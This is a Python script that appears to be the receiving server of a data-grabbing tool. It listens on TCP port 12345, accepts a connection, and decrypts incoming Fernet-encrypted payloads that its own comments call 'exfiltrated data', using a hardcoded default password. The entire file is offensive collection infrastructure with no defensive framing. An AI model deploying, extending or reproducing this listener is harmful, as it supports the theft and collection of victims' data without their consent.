import socket
import base64
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC


HOST=''
PORT=12345
BUFFER_SIZE = 1234
PASSWORD = b"password" # Change password you want .

def decrypt_message(b64_data):
    # Function to decrypt the exfiltrated data.
    raw_data = base64.b64decode(b64_data)
    salt = raw_data[:16]
    encrypted_message = raw_data[16:]

    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=1200000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(PASSWORD))
    fernet = Fernet(key)
    decrypted = fernet.decrypt(encrypted_message)
    return decrypted.decode()

def receive_data(conn):
    # Function to receive exfiltrated data.
    while True:
        try:
            data=conn.recv(BUFFER_SIZE).decode()
            if not data:
                print("\nConnection closed")
                break
            if data:
                now = datetime.now()
                current_time = now.strftime("%H:%M:%S")
                print(f"Data [{current_time}]: {decrypt_message(data)}")
            else:
                break

        except TimeoutError:
            continue

    sock.close()

if __name__ == "__main__":
    banner="""
                     _                              
         ___ ___ ___| |_    ___ ___ ___ _ _ ___ ___ 
        | . |  _| .'| . |  |_ -| -_|  _| | | -_|  _|
        |_  |_| |__,|___|  |___|___|_|  \\_/|___|_|  
        |___|      

                    Author :  Pevinkumar A 
                    GitHub :  PkTheHacker10\n"""
    print(banner)
    try:
        sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.bind((HOST,PORT))
        sock.listen()

    except Exception as E:
        print(f"Exception : {E}")

    conn,addr=sock.accept()
    print(f"Connection established from {addr[0]}:{addr[1]}")
    receive_data(conn)


